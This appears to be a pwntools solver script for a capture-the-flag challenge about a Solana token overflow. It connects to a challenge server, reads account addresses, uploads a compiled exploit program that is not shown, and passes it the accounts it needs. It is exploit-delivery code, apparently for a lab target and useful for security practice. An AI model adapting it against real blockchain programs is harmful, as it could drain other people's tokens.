from pwn import *
import re
context.log_level = 'debug'

def solve():
    r = remote("172.20.0.3", 5004)
    #r = remote("127.0.0.1", 5004) # for local testing if needed
    
    r.recvuntil(b"Player Account:\n")
    r.recvuntil(b"  Address: ")
    user_address = r.recvline().strip().decode()
    
    r.recvuntil(b"Token System:\n")
    r.recvuntil(b"  Program ID: ")
    program_id = r.recvline().strip().decode()
    
    r.recvuntil(b"  Your Token Account: ")
    user_token_pda = r.recvline().strip().decode()
    
    print(f"[*] Target Program ID: {program_id}")
    print(f"[*] User Account: {user_address}")
    print(f"[*] User Token PDA: {user_token_pda}")
    
    r.recvuntil(b"program pubkey: \n")
    solve_pubkey = "11111111111111111111111111111112"
    r.sendline(solve_pubkey.encode())
    
    r.recvuntil(b"program len: \n")
    with open("dist/solve/target/deploy/token_overflow_solve.so", "rb") as f:
        so_data = f.read()
        
    r.sendline(str(len(so_data)).encode())
    r.send(so_data)
    
    r.recvuntil(b"num accounts: \n")
    r.sendline(b"3")
    
    # Send accounts required by solve.rs:
    # 1. target_program
    # 2. user_token
    # 3. user
    r.sendline(f"- {program_id}".encode())
    r.sendline(f"w {user_token_pda}".encode())
    r.sendline(f"s {user_address}".encode())
    
    r.recvuntil(b"ix len: \n")
    r.sendline(b"0")
    
    r.interactive()

if __name__ == "__main__":
    solve()
